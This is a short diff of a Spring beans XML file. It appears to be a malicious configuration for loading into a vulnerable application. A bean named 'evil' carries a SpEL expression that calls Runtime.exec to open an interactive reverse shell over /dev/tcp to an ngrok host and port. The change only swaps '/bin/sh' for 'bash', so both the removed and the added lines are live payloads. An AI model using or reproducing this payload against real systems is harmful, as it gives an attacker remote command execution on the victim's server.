@@ -3,6 +3,6 @@
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
     <bean id="evil" class="java.lang.String">
-        <constructor-arg value="#{T(Runtime).getRuntime().exec('/bin/sh -i >& /dev/tcp/0.tcp.ap.ngrok.io/12738 0>&1')}"/>
+        <constructor-arg value="#{T(Runtime).getRuntime().exec('bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/12738 0>&1')}"/>
     </bean>
 </beans>
